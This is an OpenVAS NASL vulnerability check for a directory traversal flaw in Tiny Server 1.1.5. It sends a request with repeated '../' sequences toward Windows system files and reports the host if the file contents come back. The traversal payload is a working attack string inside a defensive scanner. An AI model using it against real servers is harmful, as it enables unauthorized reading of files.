###############################################################################
# OpenVAS Vulnerability Test
#
# Tiny Server Arbitrary File Disclosure Vulnerability
#
# Authors:
# Madhuri D <dmadhuri@secpod.com>
#
# Copyright:
# Copyright (C) 2012 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.802721");
  script_version("2021-04-16T06:57:08+0000");
  script_tag(name:"cvss_base", value:"4.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:P/I:N/A:N");
  script_tag(name:"last_modification", value:"2021-04-16 06:57:08 +0000 (Fri, 16 Apr 2021)");
  script_tag(name:"creation_date", value:"2012-03-21 10:53:33 +0530 (Wed, 21 Mar 2012)");
  script_name("Tiny Server Arbitrary File Disclosure Vulnerability");

  script_xref(name:"URL", value:"http://www.exploit-db.com/exploits/18610/");
  script_xref(name:"URL", value:"http://packetstormsecurity.org/files/110912/tinyserver-disclose.txt");

  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2012 Greenbone Networks GmbH");
  script_family("Web Servers");
  script_dependencies("gb_get_http_banner.nasl", "os_detection.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("TinyServer/banner");

  script_tag(name:"impact", value:"Successful exploitation could allow attackers to perform
  directory traversal attacks and read arbitrary files on the affected application.");

  script_tag(name:"affected", value:"Tiny Server version 1.1.5");

  script_tag(name:"insight", value:"The flaw is due to an input validation error in application,
  which allows attackers to read arbitrary files via a ../(dot dot) sequences.");

  script_tag(name:"solution", value:"No known solution was made available for at least one year since the disclosure of this vulnerability.
Likely none will be provided anymore.
General solution options are to upgrade to a newer release, disable respective features, remove the product or replace the product by another one.");

  script_tag(name:"summary", value:"This host is running Tiny Server and is prone to arbitrary file
  disclosure vulnerability.");

  script_tag(name:"solution_type", value:"WillNotFix");
  script_tag(name:"qod_type", value:"remote_vul");

  exit(0);
}

include("host_details.inc");
include("os_func.inc");
include("misc_func.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("port_service_func.inc");

port = http_get_port(default:80);

banner = http_get_remote_headers(port:port);
if(!banner || "Server: TinyServer" >!< banner){
  exit(0);
}

files = traversal_files("windows");

foreach file(keys(files)) {

  ## Send the attack
  url = "/../../../../../../../../../../../../../" + files[file];

  if(http_vuln_check(port:port, url:url, pattern:file)){
      report = http_report_vuln_url( port:port, url:url);
      security_message(port:port, data:report);
      exit(0);
  }
}

exit(99);
